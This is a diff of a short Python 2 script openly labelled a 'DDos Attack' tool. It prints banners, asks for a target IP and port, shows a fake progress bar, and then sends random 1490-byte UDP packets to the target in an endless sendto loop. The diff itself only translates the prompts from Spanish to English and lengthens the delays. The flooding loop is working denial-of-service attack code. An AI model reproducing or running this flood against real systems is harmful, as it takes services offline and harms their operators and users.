@@ -1,5 +1,4 @@
- 
-import sys
+ import sys
 import os
 import time
 import socket
@@ -21,6 +20,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
+print
 print ".######  ######## ########  ####    ###    ##    ## #### "
 print "##    ## ##       ##     ##  ##    ## ##   ###   ##  ##  "
 print "##       ##       ##     ##  ##   ##   ##  ####  ##  ##  "
@@ -39,21 +39,21 @@ print " ,d8P'         `8b       d8' "
 print "a88*        d8b `8ba, ,ad8'  "
 print "88888888888 Y8P   *Y888P*    "
 print
-ip = raw_input("IP De Ataque : ")
-port = input("Puerto : ")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(1)
+time.sleep(5)
 print "[=====               ] 25%"
-time.sleep(1)
+time.sleep(5)
 print "[==========          ] 50%"
-time.sleep(1)
+time.sleep(5)
 print "[===============     ] 75%"
-time.sleep(1)
+time.sleep(5)
 print "[====================] 100%"
-time.sleep(1)
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
